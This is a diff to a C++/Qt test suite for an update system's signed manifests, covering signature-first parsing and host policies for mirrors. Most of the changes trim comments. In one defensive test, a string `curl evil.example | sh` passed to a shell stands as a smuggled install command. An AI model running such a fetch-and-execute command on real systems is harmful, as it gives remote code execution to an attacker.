@@ -1,14 +1,12 @@
 // Lightning secure update system: signature envelope, Ed25519 verification
 // and strict manifest parsing.
 //
-// The signing key is generated inside the test at runtime through OpenSSL,
-// so real signatures are exercised without any key material existing in the
-// repository. No private key is written, printed, or committed.
+// The signing key is generated at runtime through OpenSSL; no key material
+// exists in the repository and no private key is written or printed.
 //
-// The property this suite exists to defend: a manifest field is only ever
-// used after the detached signature over the RAW bytes has verified against
-// a key this build already trusted, and nothing in the manifest can name a
-// command to run.
+// A manifest field is used only after the detached signature over the raw
+// bytes verifies against a key this build trusts, and nothing in the manifest
+// can name a command to run.
 
 #include "update/InstallType.h"
 #include "update/SignatureVerifier.h"
@@ -418,9 +416,8 @@ void UpdateManifestTest::rejectsAnEmptySignatureDocument()
 
 void UpdateManifestTest::verifiesBeforeParsing()
 {
-    // Garbage that is NOT valid JSON, with a signature made over something
-    // else: the reported error must be the SIGNATURE, proving the document
-    // was never parsed first.
+    // Invalid JSON with a signature over something else: the error must be the
+    // signature, proving the document was never parsed first.
     const QByteArray garbage = QByteArrayLiteral("this is not json at all");
     const QByteArray foreignSignature = m_signer.sign(QByteArrayLiteral("a different payload"));
     const UpdateManifest::Result unsigned_ = UpdateManifest::parseVerified(
@@ -648,11 +645,9 @@ void UpdateManifestTest::rejectsAForeignReleaseNotesLink()
     QCOMPARE(ok.manifest.releaseNotesUrl().host(), lightning::update::canonicalUpdateHost());
 }
 
-// Metadata is CANONICAL-ONLY. A bandwidth mirror may carry artifact bytes and
-// nothing else: this link describes the release, and the release authority is
-// GitLab. Accepting it from a mirror would let a mirror compromise put an
-// attacker's page in front of the user under Lightning's own "release notes"
-// affordance.
+// Metadata is canonical-only: a mirror may carry artifact bytes and nothing
+// else, or a compromised mirror could put its own page behind the "release
+// notes" affordance.
 void UpdateManifestTest::rejectsAReleaseNotesLinkOnAMirrorHost()
 {
     if (mirrorHost().isEmpty())
@@ -671,11 +666,9 @@ void UpdateManifestTest::rejectsAReleaseNotesLinkOnAMirrorHost()
     QVERIFY(isAllowedArtifactUrl(QUrl(mirrorArtifactUrl(QStringLiteral("x.deb")))));
 }
 
-// The canonical `url` is the fallback the mirror falls back TO, so it must be
-// the release authority's own host. If a manifest could name a mirror there as
-// well, both addresses could point at the same third party and a single outage
-// would leave no working source -- hash verification would still hold, but the
-// availability guarantee this whole design rests on would be gone.
+// The canonical `url` is what the mirror falls back to, so it must be on the
+// release authority's own host; otherwise both addresses could share one
+// third party and one outage would leave no working source.
 void UpdateManifestTest::rejectsACanonicalUrlOnAMirrorHost()
 {
     if (mirrorHost().isEmpty())
@@ -756,15 +749,9 @@ void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost_data()
         << QStringLiteral("https://%1:8443/%2").arg(mirror, file);
 }
 
-// A manifest naming a host this build does not trust is a manifest to REFUSE,
-// not one to sanitise: silently dropping the bad field would act on a
-// document we have already decided is wrong about where bytes live.
-// An untrusted mirror host is IGNORED, not fatal. Failing the document would
-// be a fleet hazard: the day the project moves the mirror, every installed
-// client with an older compiled-in host list would reject every later manifest
-// outright -- including the perfectly good canonical address inside it -- and
-// could never be updated again. Dropping the field is fail-closed on trust and
-// merely gives up the bandwidth saving.
+// An untrusted mirror host is ignored, not fatal: failing the whole document
+// would stop older clients with a stale host list from ever updating again
+// after the mirror moves. Dropping the field is still fail-closed on trust.
 void UpdateManifestTest::rejectsAMirrorOnAnUnlistedHost()
 {
     if (mirrorHost().isEmpty())
@@ -835,10 +822,9 @@ void UpdateManifestTest::separatesMetadataAndArtifactHostPolicies()
                            QStringLiteral("release-assets.githubusercontent.com") }));
 #endif
 
-    // v0.7.3 availability fallback. The mirrored manifest pair is read ONLY
-    // after the canonical host fails, and it is still a mirror host — the
-    // canonical predicate must keep refusing it, or the relaxation would
-    // have quietly become "metadata from anywhere".
+    // The mirrored manifest pair is read only after the canonical host fails,
+    // and it is still a mirror host, so the canonical predicate must keep
+    // refusing it.
     const QUrl mirrorManifest = mirrorLatestManifestUrl();
     const QUrl mirrorSignature = mirrorLatestManifestSignatureUrl();
     if (!mirrorManifest.isEmpty()) {
@@ -917,10 +903,9 @@ void UpdateManifestTest::ignoresUnknownFieldsAndArtifactKeys()
 
 void UpdateManifestTest::manifestCanNeverCarryACommand()
 {
-    // A signed manifest that tries to smuggle an install command. Parsing
-    // must succeed (unknown fields are ignored) while the command text
-    // reaches nothing: there is no field, accessor, or type in the parsed
-    // manifest that can hold it, so it cannot reach an execution path.
+    // A signed manifest that tries to smuggle an install command: parsing
+    // succeeds (unknown fields are ignored) and nothing in the parsed manifest
+    // can hold the text.
     const QString payload = QStringLiteral("/bin/sh -c 'curl evil.example | sh'");
     QJsonObject manifest = baseManifest();
     manifest.insert(QStringLiteral("install_command"), payload);
@@ -1053,8 +1038,8 @@ void UpdateManifestTest::validatesUpdateUrls()
 
 void UpdateManifestTest::expiryIsOptionalAndInformational()
 {
-    // A client must keep working from a manifest with no expiry, or one long
-    // past it: the maintainer's servers may be gone. Absent reads as never.
+    // A manifest with no expiry, or one long past it, must keep working:
+    // absent reads as never.
     QJsonObject manifest = baseManifest();
     manifest.remove(QStringLiteral("expires"));
     UpdateManifest::Result result = verify(manifest);
